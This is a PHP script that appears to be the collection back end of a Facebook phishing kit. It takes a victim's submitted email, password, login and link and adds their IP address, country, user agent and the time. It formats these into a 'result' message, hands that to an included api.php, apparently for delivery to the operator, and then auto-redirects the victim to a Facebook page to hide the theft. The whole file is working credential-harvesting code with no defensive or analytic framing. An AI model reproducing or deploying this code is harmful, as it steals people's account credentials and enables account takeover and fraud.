<?php
require 'detect.php';
include 'setting.php';
$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['user'];
$password = $_POST['pass'];
$short= $_POST['short'];
$login = $_POST['login'];

//auth license //

if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}else{

//Sitemap include //


$msg = ("
[+]====lSETOR RESULT BOKEP===[+]
🔗 Link : ".$short."
*️⃣ Login : ".$login."
✉️ Email : ".$email."
🔐 Password : ".$password."

[+]============System============[+]
👨‍💻 IP INFO : ".$IP."

⏳ Time/Date : ".$times." / ".$date."

🌍 Country : ".$country."

🌐 ".$useragent."
");

$url = $msg;include("api.php");

if($url) {
echo "<form id='imnoob59' method='POST' action='https://m.facebook.com/messages/read/?tid=cid.g.5028892857176687&entrypoint=jewel&surface_hierarchy=unknown'>
<input type='hidden'>
</form>
<script type='text/javascript'>document.getElementById('imnoob59').submit();</script>";
}
}
?>